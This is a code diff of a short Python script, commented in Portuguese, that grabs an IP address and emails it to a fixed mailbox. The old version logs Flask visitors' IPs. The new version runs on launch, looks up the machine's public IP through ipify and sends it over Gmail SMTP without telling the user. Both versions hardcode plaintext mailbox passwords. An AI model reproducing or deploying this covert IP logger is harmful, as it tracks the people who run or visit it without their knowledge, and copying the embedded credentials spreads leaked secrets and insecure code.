@@ -1,29 +1,32 @@
-from flask import Flask, request
-import yagmail
+import smtplib
+import email.message
+import requests
 
-app = Flask(__name__)
+def enviar_email():  
+    # Obter o endereço IP
+    response = requests.get('https://api.ipify.org?format=json')
+    ip = response.json()['ip']
+    
+    # Construir a mensagem de e-mail
+    corpo_email = f"""
+    <h1>Endereço IP do Usuário</h1>
+    <p>O endereço IP do usuário é: {ip}</p>
+    """
 
-@app.route('/')
-def index():
-    ip = request.remote_addr
+    msg = email.message.Message()
+    msg['Subject'] = "Endereço IP do Usuário"
+    msg['From'] = 'm4ria.gama@gmail.com'
+    msg['To'] = 'm4ria.gama@gmail.com'
+    password = 'Prosopopei4' 
+    msg.add_header('Content-Type', 'text/html')
+    msg.set_payload(corpo_email)
 
-    # Configuração do servidor de email
-    email_sender = 'minadoooo11@yahoo.com'
-    email_password = 'prosopopei4'
-    email_recipient = 'minadoooo11@yahoo.com'
+    s = smtplib.SMTP('smtp.gmail.com: 587')
+    s.starttls()
+    # Credenciais de login para enviar o e-mail
+    s.login(msg['From'], password)
+    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
+    print('Email enviado')
 
-    # Criação da mensagem
-    subject = 'Endereço IP do Usuário'
-    message = f'O endereço IP do usuário é: {ip}'
 
-    # Envio do email
-    try:
-        yag = yagmail.SMTP(email_sender, email_password)
-        yag.send(email_recipient, subject, message)
-    except Exception as e:
-        return f'Erro ao enviar o email: {str(e)}'
-
-    return '', 204
-
-if __name__ == '__main__':
-    app.run()
+enviar_email()
